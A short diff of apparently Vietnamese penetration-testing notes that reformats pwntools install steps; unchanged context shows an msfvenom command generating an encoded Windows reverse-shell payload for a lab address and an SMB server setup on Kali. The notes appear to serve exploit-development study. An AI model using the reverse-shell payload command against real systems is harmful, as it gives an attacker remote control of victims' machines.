@@ -30,9 +30,10 @@
   - msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=8080 -f python –e x86/shikata_ga_nai -b "\x00..."
     
 
-Cài pwntool
-python3 -m pip install --upgrade pip
-python3 -m pip install --upgrade pwntools
+- Cài pwntool
+  - python3 -m pip install --upgrade pip
+
+  - python3 -m pip install --upgrade pwntools
 
 - Setup smbserver trên kali:
 sudo smbserver.py met /home/kali/ -smb2support
